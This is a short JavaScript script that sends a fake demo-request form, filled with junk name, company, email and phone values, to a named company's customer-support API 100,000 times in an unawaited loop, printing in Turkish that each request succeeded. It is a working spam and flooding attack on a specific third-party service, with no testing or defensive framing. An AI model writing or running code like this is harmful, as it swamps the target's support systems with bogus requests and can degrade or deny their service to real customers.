import axios from "axios";

const data = {
  comments: "Product(s) : KIS Park,\n\n - araba",
  company: "111",
  email: "1112312@gmail.com",
  fullName: "111",
  phoneNumber: "11111111111",
};

const istekAt = async () => {
  try {
    const response = await axios.post(
      "https://api.kisticket.com/customer/customerSuport/requestDemo",
      data
    );
    console.log("Request successful:", response.data);
  } catch (error) {
    console.error("Error:", error.message);
  }
};

for (let index = 0; index < 100000; index++) {
  console.log(index + " kez istek atildi ve basarili.");
  istekAt();
}
